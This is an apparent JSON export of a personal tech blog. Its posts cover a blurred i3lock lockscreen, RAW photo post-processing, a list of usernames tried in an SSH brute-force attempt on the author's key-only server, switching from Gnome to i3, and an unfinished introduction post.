3x1000 -level 0,85%,0.5 -\n/home/scott/.scripts/lockimg.png i3lock -i /home/scott/.scripts/lockimg.png","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-02-10T02:38:26.000Z","created_by":"1","updated_at":"2017-02-10T02:38:26.000Z","updated_by":"1","published_at":"2017-02-10T02:38:26.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332777","uuid":"74262e22-891f-42a7-a8d3-10517f907ccb","title":"The importance of RAW file formats and post-processing for color- and lighting-correction.","slug":"the-importance-of-raw-file-formats-and-post-processing-for-color-and-lighting-correction","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI got my first DSLR for $150 off of a friend of a friend who was selling it on Facebook. It was close to 10 years old, but it shot RAW files at 8+ megapixels, so I felt that I could finally start to delve into the world of photography. I always shot my photos in either RAW or RAW+JPG/fine so that I could see what all was possible with the digital file format. I realized that using RAW would give me more photographic data to work with in post-processing, but I had no idea how drastic the effect would be. RAW images are incomplete – they need to be compressed in order to appear properly. They need data to be *removed* from the image before it will look like a good representation of the original image. Let me provide some examples:\\n\\n[![](https://blog.tams.tech/wp-content/uploads/2017/02/example1.small_.gif)](https://blog.tams.tech/wp-content/uploads/2017/02/example1.small_.gif)\\n\\n[![](https://blog.tams.tech/wp-content/uploads/2017/02/IMG_9710.lessSmall-1.gif)](https://blog.tams.tech/wp-content/uploads/2017/02/IMG_9710.lessSmall-1.gif)\\n\\n \\n\\nNow, the unfortunate part of that is that while my (new, since the above pictures were taken) camera can shoot video and can shoot much higher-quality images than the camera I was using when I took the above pictures, it’s still incapable of recording the data of a raw-recorded video. It just doesn’t have the memory bandwidth to support recording of such a resource-hungry uncompressed format. I’m using my [raspberry pi model B to record audio in](https://blog.tams.tech/2017/01/a-bash-script-on-the-raspberry-pi-to-automatically-record-audio-when-the-microphone-is-connected/) .wav format, but recording raw frames from the HDMI output on my camera would [cost about as much](https://www.amazon.com/Blackmagic-Design-HyperDeck-Shuttle-Recorder/dp/B00701AN5Y/) as the [camera cost](https://www.amazon.com/SanDisk-120GB-SDSSDA-120G-G26-Newest-Version/dp/B01F9G414U/) in the first place. And that’s only for my camera. I wouldn’t be able to use that with two cameras at once. Essentially, that one step would nearly double the budget of the entire film. So we decided it’s not worth it. But I did want to take this opportunity to emphasize how much the raw file-format can help with post-processing and final-render quality.\\n\\nBasically, when a camera records an image, it records *a lot* of extra data that isn’t really relevant to the particular shot. In some shots, perhaps the low-frequency range will be relevant, in others, it might be the opposite. When you see things, your brain naturally filters this information out, but cameras don’t have such features naturally; it has to be programmed or done by hand after the photo is taken. By shooting in raw, it allows you a bit of freedom to capture an image that might be in lighting that is less than adequate or tinted strongly to a specific color, and then to remove the *extra* data that’s gathered in order to get a more clear and correctly-colored photo. When you process or develop a digital image, you aren’t *adding* data or drawing into it, you’re *removing* information from the raw image.\\n\\nThat’s not a big deal if you’re just shooting some regular daylight stuff; using a fraction of your frame-rate per frame, receiving more light-data than your camera can record in a given time period. But, if you’re pushing 30fps and ekeing as much as you can out of the ISO settings, you’re going to have next to nothing to work with in post-processing. That is, your shots will be almost un-edit-able, viewable only as they were originally recorded, because no extra data was recorded alongside the base JPG/MPG file for you to work with.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I got my first DSLR for $150 off of a friend of a friend who was selling it on Facebook. It was close to 10 years old, but it shot RAW files at 8+ megapixels, so I felt that I could finally start to delve into the world of photography. I always shot my photos in either RAW or RAW+JPG/fine so that I could see what all was possible with the digital file format. I realized that using RAW would give me more photographic data to work with in post-processing, but I had no idea how drastic the effect would be. RAW images are incomplete – they need to be compressed in order to appear properly. They need data to be <em>removed</em> from the image before it will look like a good representation of the original image. Let me provide some examples:</p>\n<p><a href=\"https://blog.tams.tech/wp-content/uploads/2017/02/example1.small_.gif\"><img src=\"https://blog.tams.tech/wp-content/uploads/2017/02/example1.small_.gif\" alt=\"\"></a></p>\n<p><a href=\"https://blog.tams.tech/wp-content/uploads/2017/02/IMG_9710.lessSmall-1.gif\"><img src=\"https://blog.tams.tech/wp-content/uploads/2017/02/IMG_9710.lessSmall-1.gif\" alt=\"\"></a></p>\n<p></p>\n<p>Now, the unfortunate part of that is that while my (new, since the above pictures were taken) camera can shoot video and can shoot much higher-quality images than the camera I was using when I took the above pictures, it’s still incapable of recording the data of a raw-recorded video. It just doesn’t have the memory bandwidth to support recording of such a resource-hungry uncompressed format. I’m using my <a href=\"https://blog.tams.tech/2017/01/a-bash-script-on-the-raspberry-pi-to-automatically-record-audio-when-the-microphone-is-connected/\">raspberry pi model B to record audio in</a> .wav format, but recording raw frames from the HDMI output on my camera would <a href=\"https://www.amazon.com/Blackmagic-Design-HyperDeck-Shuttle-Recorder/dp/B00701AN5Y/\">cost about as much</a> as the <a href=\"https://www.amazon.com/SanDisk-120GB-SDSSDA-120G-G26-Newest-Version/dp/B01F9G414U/\">camera cost</a> in the first place. And that’s only for my camera. I wouldn’t be able to use that with two cameras at once. Essentially, that one step would nearly double the budget of the entire film. So we decided it’s not worth it. But I did want to take this opportunity to emphasize how much the raw file-format can help with post-processing and final-render quality.</p>\n<p>Basically, when a camera records an image, it records <em>a lot</em> of extra data that isn’t really relevant to the particular shot. In some shots, perhaps the low-frequency range will be relevant, in others, it might be the opposite. When you see things, your brain naturally filters this information out, but cameras don’t have such features naturally; it has to be programmed or done by hand after the photo is taken. By shooting in raw, it allows you a bit of freedom to capture an image that might be in lighting that is less than adequate or tinted strongly to a specific color, and then to remove the <em>extra</em> data that’s gathered in order to get a more clear and correctly-colored photo. When you process or develop a digital image, you aren’t <em>adding</em> data or drawing into it, you’re <em>removing</em> information from the raw image.</p>\n<p>That’s not a big deal if you’re just shooting some regular daylight stuff; using a fraction of your frame-rate per frame, receiving more light-data than your camera can record in a given time period. But, if you’re pushing 30fps and ekeing as much as you can out of the ISO settings, you’re going to have next to nothing to work with in post-processing. That is, your shots will be almost un-edit-able, viewable only as they were originally recorded, because no extra data was recorded alongside the base JPG/MPG file for you to work with.</p>\n</div>","amp":"168","plaintext":"I got my first DSLR for $150 off of a friend of a friend who was selling it on\nFacebook. It was close to 10 years old, but it shot RAW files at 8+ megapixels,\nso I felt that I could finally start to delve into the world of photography. I\nalways shot my photos in either RAW or RAW+JPG/fine so that I could see what all\nwas possible with the digital file format. I realized that using RAW would give\nme more photographic data to work with in post-processing, but I had no idea how\ndrastic the effect would be. RAW images are incomplete – they need to be\ncompressed in order to appear properly. They need data to beremoved  from the\nimage before it will look like a good representation of the original image. Let\nme provide some examples:\n\n  [https://blog.tams.tech/wp-content/uploads/2017/02/example1.small_.gif]\n\n  [https://blog.tams.tech/wp-content/uploads/2017/02/IMG_9710.lessSmall-1.gif]\n\n\n\nNow, the unfortunate part of that is that while my (new, since the above\npictures were taken) camera can shoot video and can shoot much higher-quality\nimages than the camera I was using when I took the above pictures, it’s still\nincapable of recording the data of a raw-recorded video. It just doesn’t have\nthe memory bandwidth to support recording of such a resource-hungry uncompressed\nformat. I’m using my raspberry pi model B to record audio in\n[https://blog.tams.tech/2017/01/a-bash-script-on-the-raspberry-pi-to-automatically-record-audio-when-the-microphone-is-connected/] \n .wav format, but recording raw frames from the HDMI output on my camera would \ncost about as much\n[https://www.amazon.com/Blackmagic-Design-HyperDeck-Shuttle-Recorder/dp/B00701AN5Y/] \n as the camera cost\n[https://www.amazon.com/SanDisk-120GB-SDSSDA-120G-G26-Newest-Version/dp/B01F9G414U/] \n in the first place. And that’s only for my camera. I wouldn’t be able to use\nthat with two cameras at once. Essentially, that one step would nearly double\nthe budget of the entire film. So we decided it’s not worth it. But I did want\nto take this opportunity to emphasize how much the raw file-format can help with\npost-processing and final-render quality.\n\nBasically, when a camera records an image, it recordsa lot  of extra data that\nisn’t really relevant to the particular shot. In some shots, perhaps the\nlow-frequency range will be relevant, in others, it might be the opposite. When\nyou see things, your brain naturally filters this information out, but cameras\ndon’t have such features naturally; it has to be programmed or done by hand\nafter the photo is taken. By shooting in raw, it allows you a bit of freedom to\ncapture an image that might be in lighting that is less than adequate or tinted\nstrongly to a specific color, and then to remove theextra  data that’s gathered\nin order to get a more clear and correctly-colored photo. When you process or\ndevelop a digital image, you aren’tadding  data or drawing into it, you’re\nremoving  information from the raw image.\n\nThat’s not a big deal if you’re just shooting some regular daylight stuff; using\na fraction of your frame-rate per frame, receiving more light-data than your\ncamera can record in a given time period. But, if you’re pushing 30fps and\nekeing as much as you can out of the ISO settings, you’re going to have next to\nnothing to work with in post-processing. That is, your shots will be almost\nun-edit-able, viewable only as they were originally recorded, because no extra\ndata was recorded alongside the base JPG/MPG file for you to work with.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-02-12T03:58:54.000Z","created_by":"1","updated_at":"2017-02-12T03:58:54.000Z","updated_by":"1","published_at":"2017-02-12T03:58:54.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332778","uuid":"94ecac4d-a68f-4405-bde4-7182b798e57a","title":"Someone has been trying to brute force my SSH....again","slug":"someone-has-been-trying-to-brute-force-my-ssh-again","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI get why this is such a big target. There are tons of devices out there with SSH connections *wide* open – a default username and password on a public-facing port 22. I have an SSH server running, but it only accepts publickey authentication, and doesn’t even prompt for a password. Nonetheless, someone tried a series of 64 “default” usernames on my open port over a period of about 24 hours. Most of them make sense – things like ‘user’, ‘admin’, ‘root’, and ‘bot’ didn’t surprise me at all, but I guess this could serve as a good list of “don’t have these usernames on public-facing ports”, but even still, the standard practice of only authenticating through maximally-long random keys applies and would make a successful brute force attack…extremely unlikely.\\n\\n> <span style=\\\"color: #333333;\\\">ubnt, arkserver, teste, ts3server, vpn, plex, minecraft, sinusbot, botmaster, arma3server, csserver, dspace, git, mc, ubuntu, debian, teamspeak, its, server, support, csgo, ftpuser, gituser, import, share, hadoop, user1, zabbix, nagios, devuser, ftptest, shop, apache, sysadmin, guest, test1, ghost, steam, postgres, admin, confluence, test, ubnt, webmaster, oracle, manager, www, musicbot, bot, arkserver, teste, ts3server, vpn, plex, minecraft, sinusbot, botmaster, arma3server, csserver, dspace, git, shop, ts3, mc</span>\\n\\nIf you happen to be a person who attempts to access SSH in this manner, I’d love an anonymous comment below discussing the goal being sought here. Are you simply looking for weak authentication or is there something else I’m missing here?\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I get why this is such a big target. There are tons of devices out there with SSH connections <em>wide</em> open – a default username and password on a public-facing port 22. I have an SSH server running, but it only accepts publickey authentication, and doesn’t even prompt for a password. Nonetheless, someone tried a series of 64 “default” usernames on my open port over a period of about 24 hours. Most of them make sense – things like ‘user’, ‘admin’, ‘root’, and ‘bot’ didn’t surprise me at all, but I guess this could serve as a good list of “don’t have these usernames on public-facing ports”, but even still, the standard practice of only authenticating through maximally-long random keys applies and would make a successful brute force attack…extremely unlikely.</p>\n<blockquote>\n<p><span style=\"color: #333333;\">ubnt, arkserver, teste, ts3server, vpn, plex, minecraft, sinusbot, botmaster, arma3server, csserver, dspace, git, mc, ubuntu, debian, teamspeak, its, server, support, csgo, ftpuser, gituser, import, share, hadoop, user1, zabbix, nagios, devuser, ftptest, shop, apache, sysadmin, guest, test1, ghost, steam, postgres, admin, confluence, test, ubnt, webmaster, oracle, manager, www, musicbot, bot, arkserver, teste, ts3server, vpn, plex, minecraft, sinusbot, botmaster, arma3server, csserver, dspace, git, shop, ts3, mc</span></p>\n</blockquote>\n<p>If you happen to be a person who attempts to access SSH in this manner, I’d love an anonymous comment below discussing the goal being sought here. Are you simply looking for weak authentication or is there something else I’m missing here?</p>\n</div>","amp":"192","plaintext":"I get why this is such a big target. There are tons of devices out there with\nSSH connectionswide  open – a default username and password on a public-facing\nport 22. I have an SSH server running, but it only accepts publickey\nauthentication, and doesn’t even prompt for a password. Nonetheless, someone\ntried a series of 64 “default” usernames on my open port over a period of about\n24 hours. Most of them make sense – things like ‘user’, ‘admin’, ‘root’, and\n‘bot’ didn’t surprise me at all, but I guess this could serve as a good list of\n“don’t have these usernames on public-facing ports”, but even still, the\nstandard practice of only authenticating through maximally-long random keys\napplies and would make a successful brute force attack…extremely unlikely.\n\nubnt, arkserver, teste, ts3server, vpn, plex, minecraft, sinusbot, botmaster,\narma3server, csserver, dspace, git, mc, ubuntu, debian, teamspeak, its, server,\nsupport, csgo, ftpuser, gituser, import, share, hadoop, user1, zabbix, nagios,\ndevuser, ftptest, shop, apache, sysadmin, guest, test1, ghost, steam, postgres,\nadmin, confluence, test, ubnt, webmaster, oracle, manager, www, musicbot, bot,\narkserver, teste, ts3server, vpn, plex, minecraft, sinusbot, botmaster,\narma3server, csserver, dspace, git, shop, ts3, mc\n\nIf you happen to be a person who attempts to access SSH in this manner, I’d love\nan anonymous comment below discussing the goal being sought here. Are you simply\nlooking for weak authentication or is there something else I’m missing here?","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-02-13T20:43:28.000Z","created_by":"1","updated_at":"2017-12-03T15:54:53.000Z","updated_by":"1","published_at":"2017-02-13T20:43:28.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332779","uuid":"2d703867-4bd3-448f-8ff2-79929db3592b","title":"A little bit on why I'm trying to move away from Gnome, but I still recommend it.","slug":"a-little-bit-on-why-im-trying-to-move-away-from-gnome-but-i-still-recommend-it","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nDon’t get me wrong, Gnome is amazing. Gnome+Debian is probably the most realistic candidate for Linux-as-a-desktop, and I would recommend it over Ubuntu/Unity. The thing is, it’s just not for me.\\n\\nReally, though, that’s the beautiful thing about Linux, but I feel like that’s a topic for a later post. In this one, I want to talk about gnome.\\n\\nI started out, like many 90’s kids who turned to linux, on Ubuntu. It was easy, and worked out-of-the-box, but provided me a nice segway into the world of the terminal, the piecemeal nature of Linux, and the amazing benefits of using open-source software and hardware whenever it is available to you. I started dual-booting ubuntu around 10.something or so, and finally went to a fully-linux main install when I bought my server to replace my laptops, and bought it specifically to run Virutal Machines. The only hold-out program I still use (and have been using for years) is Fruity Loops. I digress.\\n\\nWhen I upgraded to 16.04, I was hit by a *nasty* bug that caused frequent, but entirely random and unpredictable reboots on my hardware. Log data wasn’t helpful, nothing I did fixed it. That’s when I remembered Debian, the more stable parent to Ubuntu that had come a long way since Canonical’s awesome success with Ubuntu.\\n\\nI downloaded Debian Jessie, and installed Gnome on top of it, and let me tell you, I was impressed. I had originally abandoned the idea of using Debian after seeing their XFCE interface, but this change gave me an idea, and that idea led to a better understanding of the Linux/GNU architecture and how to have an ideal system *for you* rather than a system that *just *(sort of)* works* for everyone.\\n\\nNow, I’m not someone who linux-as-a-desktop is really geared towards. 90% of the time I have at least two terminals open, often time more than that. I host several web servers from my home internet, like this one. I spend a *significant* quantity of my time sitting in a chair, staring at a screen, just reading documentation. I’ve been learning Android Development by reading the Android documentation on the shitter. I’m not your typical PC user. If what I’ve said above doesn’t make sense to you, I sincerely recommend Debian with Gnome or Ubuntu as your first move into Linux, and you may continue to use those forever as solid desktop environments. Really, they’re great, but they’re not for me. Here’s why —\\n\\n1. They’re much larger. They’re not the enormous windows blob of mystery, but they are a lot heavier and hence take a lot longer to boot and to load applications and other features. My debian+i3 install is probably ~1GB, intalled. According to 2 minutes of googling, Ubuntu takes about 3GB to install. On your hard drive, that may not seem like a lot, but all of that extra space is extra stuff that has to be loaded any time you take an action or whenever you boot, depending on the component.\\n2.  i3 is extremely transparent in it’s configuration and while it may not succeed everywhere it tries, it genuinely tries to show you how it works and how you can modify it *and* the things it runs on top of easier. Every user of i3 has their own way of using the keybindings, and their own visual setup. Many go deep and modify the system itself for their purposes. Gnome, on the other hand, and to a lesser extent Unity, actively try to *hide* that sort of information and settings. This is the largest philosophical difference: Gnome/Unity focus on *usability*, while i3 focuses on *customizability*.\\n3. i3 is piecemeal, whereas the others are very monolithic, especially Gnome. Whenever you install a package for i3, it installs the bare minimum it has to. Gnome relies on parent and virtual packages that often times require that most, if not all, of the desktop environment be installed, rather than just installing a single component. For both security and speed purposes, it is best to keep the number of installed packages at a minimum\\n\\nFor me the biggest thing is the focus on configurability. There were times when I would want to make a minor change to the way Gnome functions, because it’s close but not just right for me, and that task would be a whole lot more difficult than I thought. While I still have yet to figure out layout-saving in i3, one of the first things I did was set up a custom status bar with information relevant to me, and when I decided I wanted to have my lockscreen be a blurred screenshot instead of a plain color or consistent image, that took me just a couple hours to throw together.\\n\\nThis also brings to the forefront of discussion the piecemeal nature of the GNU/Linux system itself. My system is “a Debian Jessie install on Linux/GNU, running i3 as the window manager, conky for a status bar, and lightdm for a login-screen/greeter”, rather than “Windows X” or “Mac OS 10 big cat”. The term “linux” doesn’t just apply to a single application, but often is a colloquial umbrella term for the majority of unix-like user-stations, regardless of whether it’s a Chromebook or a back-of-the-closet server from 1988. So if you’re someone who just turns on your computer and goes to Facebook or gMail or whatever, get Ubuntu or Debian/Gnome. You may well find that it’s just as good as, or better than Windows (it’s certainly faster!) But I’ve got four web sites hosted on this machine. I read documentation and source code on the toilet. I’m ***not*** your typical “PC user”. But, that doesn’t mean that decent security and open-source ideals are unavailable to those who *are* your typical PC user. The eternally fabled “year of the linux desktop” was like two years ago, if you have someone who’s willing to set things up and make sure to help you out if things go crazy.\\n\\nAlso, I think for security purposes that those users who don’t constantly keep up with security information should retain only guest login information, or at least only login as a guest, and give the admin account to someone they trust who does follow that sort of thing. It’s so easy to fall behind and become irrevocably compromised these days.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>Don’t get me wrong, Gnome is amazing. Gnome+Debian is probably the most realistic candidate for Linux-as-a-desktop, and I would recommend it over Ubuntu/Unity. The thing is, it’s just not for me.</p>\n<p>Really, though, that’s the beautiful thing about Linux, but I feel like that’s a topic for a later post. In this one, I want to talk about gnome.</p>\n<p>I started out, like many 90’s kids who turned to linux, on Ubuntu. It was easy, and worked out-of-the-box, but provided me a nice segway into the world of the terminal, the piecemeal nature of Linux, and the amazing benefits of using open-source software and hardware whenever it is available to you. I started dual-booting ubuntu around 10.something or so, and finally went to a fully-linux main install when I bought my server to replace my laptops, and bought it specifically to run Virutal Machines. The only hold-out program I still use (and have been using for years) is Fruity Loops. I digress.</p>\n<p>When I upgraded to 16.04, I was hit by a <em>nasty</em> bug that caused frequent, but entirely random and unpredictable reboots on my hardware. Log data wasn’t helpful, nothing I did fixed it. That’s when I remembered Debian, the more stable parent to Ubuntu that had come a long way since Canonical’s awesome success with Ubuntu.</p>\n<p>I downloaded Debian Jessie, and installed Gnome on top of it, and let me tell you, I was impressed. I had originally abandoned the idea of using Debian after seeing their XFCE interface, but this change gave me an idea, and that idea led to a better understanding of the Linux/GNU architecture and how to have an ideal system <em>for you</em> rather than a system that <em>just <em>(sort of)</em> works</em> for everyone.</p>\n<p>Now, I’m not someone who linux-as-a-desktop is really geared towards. 90% of the time I have at least two terminals open, often time more than that. I host several web servers from my home internet, like this one. I spend a <em>significant</em> quantity of my time sitting in a chair, staring at a screen, just reading documentation. I’ve been learning Android Development by reading the Android documentation on the shitter. I’m not your typical PC user. If what I’ve said above doesn’t make sense to you, I sincerely recommend Debian with Gnome or Ubuntu as your first move into Linux, and you may continue to use those forever as solid desktop environments. Really, they’re great, but they’re not for me. Here’s why —</p>\n<ol>\n<li>They’re much larger. They’re not the enormous windows blob of mystery, but they are a lot heavier and hence take a lot longer to boot and to load applications and other features. My debian+i3 install is probably ~1GB, intalled. According to 2 minutes of googling, Ubuntu takes about 3GB to install. On your hard drive, that may not seem like a lot, but all of that extra space is extra stuff that has to be loaded any time you take an action or whenever you boot, depending on the component.</li>\n<li>i3 is extremely transparent in it’s configuration and while it may not succeed everywhere it tries, it genuinely tries to show you how it works and how you can modify it <em>and</em> the things it runs on top of easier. Every user of i3 has their own way of using the keybindings, and their own visual setup. Many go deep and modify the system itself for their purposes. Gnome, on the other hand, and to a lesser extent Unity, actively try to <em>hide</em> that sort of information and settings. This is the largest philosophical difference: Gnome/Unity focus on <em>usability</em>, while i3 focuses on <em>customizability</em>.</li>\n<li>i3 is piecemeal, whereas the others are very monolithic, especially Gnome. Whenever you install a package for i3, it installs the bare minimum it has to. Gnome relies on parent and virtual packages that often times require that most, if not all, of the desktop environment be installed, rather than just installing a single component. For both security and speed purposes, it is best to keep the number of installed packages at a minimum</li>\n</ol>\n<p>For me the biggest thing is the focus on configurability. There were times when I would want to make a minor change to the way Gnome functions, because it’s close but not just right for me, and that task would be a whole lot more difficult than I thought. While I still have yet to figure out layout-saving in i3, one of the first things I did was set up a custom status bar with information relevant to me, and when I decided I wanted to have my lockscreen be a blurred screenshot instead of a plain color or consistent image, that took me just a couple hours to throw together.</p>\n<p>This also brings to the forefront of discussion the piecemeal nature of the GNU/Linux system itself. My system is “a Debian Jessie install on Linux/GNU, running i3 as the window manager, conky for a status bar, and lightdm for a login-screen/greeter”, rather than “Windows X” or “Mac OS 10 big cat”. The term “linux” doesn’t just apply to a single application, but often is a colloquial umbrella term for the majority of unix-like user-stations, regardless of whether it’s a Chromebook or a back-of-the-closet server from 1988. So if you’re someone who just turns on your computer and goes to Facebook or gMail or whatever, get Ubuntu or Debian/Gnome. You may well find that it’s just as good as, or better than Windows (it’s certainly faster!) But I’ve got four web sites hosted on this machine. I read documentation and source code on the toilet. I’m <em><strong>not</strong></em> your typical “PC user”. But, that doesn’t mean that decent security and open-source ideals are unavailable to those who <em>are</em> your typical PC user. The eternally fabled “year of the linux desktop” was like two years ago, if you have someone who’s willing to set things up and make sure to help you out if things go crazy.</p>\n<p>Also, I think for security purposes that those users who don’t constantly keep up with security information should retain only guest login information, or at least only login as a guest, and give the admin account to someone they trust who does follow that sort of thing. It’s so easy to fall behind and become irrevocably compromised these days.</p>\n</div>","amp":"205","plaintext":"Don’t get me wrong, Gnome is amazing. Gnome+Debian is probably the most\nrealistic candidate for Linux-as-a-desktop, and I would recommend it over\nUbuntu/Unity. The thing is, it’s just not for me.\n\nReally, though, that’s the beautiful thing about Linux, but I feel like that’s a\ntopic for a later post. In this one, I want to talk about gnome.\n\nI started out, like many 90’s kids who turned to linux, on Ubuntu. It was easy,\nand worked out-of-the-box, but provided me a nice segway into the world of the\nterminal, the piecemeal nature of Linux, and the amazing benefits of using\nopen-source software and hardware whenever it is available to you. I started\ndual-booting ubuntu around 10.something or so, and finally went to a fully-linux\nmain install when I bought my server to replace my laptops, and bought it\nspecifically to run Virutal Machines. The only hold-out program I still use (and\nhave been using for years) is Fruity Loops. I digress.\n\nWhen I upgraded to 16.04, I was hit by anasty  bug that caused frequent, but\nentirely random and unpredictable reboots on my hardware. Log data wasn’t\nhelpful, nothing I did fixed it. That’s when I remembered Debian, the more\nstable parent to Ubuntu that had come a long way since Canonical’s awesome\nsuccess with Ubuntu.\n\nI downloaded Debian Jessie, and installed Gnome on top of it, and let me tell\nyou, I was impressed. I had originally abandoned the idea of using Debian after\nseeing their XFCE interface, but this change gave me an idea, and that idea led\nto a better understanding of the Linux/GNU architecture and how to have an ideal\nsystemfor you  rather than a system thatjust(sort of)  works  for everyone.\n\nNow, I’m not someone who linux-as-a-desktop is really geared towards. 90% of the\ntime I have at least two terminals open, often time more than that. I host\nseveral web servers from my home internet, like this one. I spend asignificant \nquantity of my time sitting in a chair, staring at a screen, just reading\ndocumentation. I’ve been learning Android Development by reading the Android\ndocumentation on the shitter. I’m not your typical PC user. If what I’ve said\nabove doesn’t make sense to you, I sincerely recommend Debian with Gnome or\nUbuntu as your first move into Linux, and you may continue to use those forever\nas solid desktop environments. Really, they’re great, but they’re not for me.\nHere’s why —\n\n 1. They’re much larger. They’re not the enormous windows blob of mystery, but\n    they are a lot heavier and hence take a lot longer to boot and to load\n    applications and other features. My debian+i3 install is probably ~1GB,\n    intalled. According to 2 minutes of googling, Ubuntu takes about 3GB to\n    install. On your hard drive, that may not seem like a lot, but all of that\n    extra space is extra stuff that has to be loaded any time you take an action\n    or whenever you boot, depending on the component.\n 2. i3 is extremely transparent in it’s configuration and while it may not\n    succeed everywhere it tries, it genuinely tries to show you how it works and\n    how you can modify itand  the things it runs on top of easier. Every user of\n    i3 has their own way of using the keybindings, and their own visual setup.\n    Many go deep and modify the system itself for their purposes. Gnome, on the\n    other hand, and to a lesser extent Unity, actively try tohide  that sort of\n    information and settings. This is the largest philosophical difference:\n    Gnome/Unity focus onusability, while i3 focuses oncustomizability.\n 3. i3 is piecemeal, whereas the others are very monolithic, especially Gnome.\n    Whenever you install a package for i3, it installs the bare minimum it has\n    to. Gnome relies on parent and virtual packages that often times require\n    that most, if not all, of the desktop environment be installed, rather than\n    just installing a single component. For both security and speed purposes, it\n    is best to keep the number of installed packages at a minimum\n\nFor me the biggest thing is the focus on configurability. There were times when\nI would want to make a minor change to the way Gnome functions, because it’s\nclose but not just right for me, and that task would be a whole lot more\ndifficult than I thought. While I still have yet to figure out layout-saving in\ni3, one of the first things I did was set up a custom status bar with\ninformation relevant to me, and when I decided I wanted to have my lockscreen be\na blurred screenshot instead of a plain color or consistent image, that took me\njust a couple hours to throw together.\n\nThis also brings to the forefront of discussion the piecemeal nature of the\nGNU/Linux system itself. My system is “a Debian Jessie install on Linux/GNU,\nrunning i3 as the window manager, conky for a status bar, and lightdm for a\nlogin-screen/greeter”, rather than “Windows X” or “Mac OS 10 big cat”. The term\n“linux” doesn’t just apply to a single application, but often is a colloquial\numbrella term for the majority of unix-like user-stations, regardless of whether\nit’s a Chromebook or a back-of-the-closet server from 1988. So if you’re someone\nwho just turns on your computer and goes to Facebook or gMail or whatever, get\nUbuntu or Debian/Gnome. You may well find that it’s just as good as, or better\nthan Windows (it’s certainly faster!) But I’ve got four web sites hosted on this\nmachine. I read documentation and source code on the toilet. I’mnot  your\ntypical “PC user”. But, that doesn’t mean that decent security and open-source\nideals are unavailable to those whoare  your typical PC user. The eternally\nfabled “year of the linux desktop” was like two years ago, if you have someone\nwho’s willing to set things up and make sure to help you out if things go crazy.\n\nAlso, I think for security purposes that those users who don’t constantly keep\nup with security information should retain only guest login information, or at\nleast only login as a guest, and give the admin account to someone they trust\nwho does follow that sort of thing. It’s so easy to fall behind and become\nirrevocably compromised these days.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-02-20T01:56:35.000Z","created_by":"1","updated_at":"2017-02-20T01:56:35.000Z","updated_by":"1","published_at":"2017-02-20T01:56:35.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133277a","uuid":"cbe487a1-4895-4a56-b73d-19709def39bc","title":"Intro","slug":"intro","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\n<!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]--><audio class=\\\"wp-audio-shortcode\\\" controls=\\\"controls\\\" id=\\\"audio-212-1\\\" preload=\\\"none\\\" style=\\\"width: 100%;\\\"><source src=\\\"https://blog.tams.tech/wp-content/uploads/2017/02/Baited-FML-Remix.mp3?_=1\\\" type=\\\"audio/mpeg\\\"></source>[https://blog.tams.tech/wp-content/uploads/2017/02/Baited-FML-Remix.mp3](https://blog.tams.tech/wp-content/uploads/2017/02/Baited-FML-Remix.mp3)</audio>Here’s Owen’s lil den in the back of TAMS. Right now I don’t have a lot of time to actually contribute written content, so for the time being this will mostly just serve as THE place to find all of the mashups, mix sets, and soundclowns I’ve made over the years. I’m in the process of migrating everything currently hosted on my SoundCloud page (linked below) over here so I can showcase only my best and more recent stuff over there, because who has the money to pay for SoundCloud Pro if they’re not actually in the music business?\\n\\nIn the future, I hope to add my ramblings on the various intersections of philosophy, neuroscience (as misunderstood by a college dropout-cum-pharmacology-hobbyist), chemistry, pharmacology (damnit, I already mentioned that), consciousness and the various theories of it’s characteristics and origins (I’m partial to Hofstadter’s “Strange Loop” theory of attention loops, full disclosure), bioinformatics, and various topics contained by the transhumanist perspective, as well as ideas pertaining to the analysis of various perspectives as it relates to finding the “truthiest truth,” which of course brings us right back to philosophy. In short, hot air.\\n\\nI will attempt to highlight my own biases in my writing so that my meanings can remain as clear as possible (refer back to “Linguistics is Broken” for a starting exploration as to why this is even worth attempting), and at some point I’ll add as full an analysis of my own proclivities as is manageable from within my own head. References will be included wherever possible, but please, if you spot any inconsistency, unfounded claim, or straight-up incomprehensible bullshit in anything I’ve written, don’t hesitate to point it out in a comment! I don’t respond violently to 